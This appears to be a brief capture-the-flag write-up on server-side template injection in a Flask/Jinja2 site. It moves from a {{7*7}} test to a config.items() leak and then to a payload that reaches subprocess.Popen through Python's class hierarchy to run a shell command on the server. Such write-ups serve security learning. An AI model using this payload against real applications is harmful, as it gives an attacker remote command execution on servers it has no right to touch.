
the website reveals that flask/jinja2 is used, this stack might be vulnerable to SSTI

testing a payload like /{{7\*7}} shows it is being evaluated as '49'

it is possible to inject payloads such as config.items()

the payload to the flag will be the following

```python
{{config.__class__.__mro__[2].__subclasses__()[414]("cat%20flag.txt",shell=True,stdout=-1).communicate()}}
```
(414 is the index of subprocess.popen() which allows for command execution in the server)
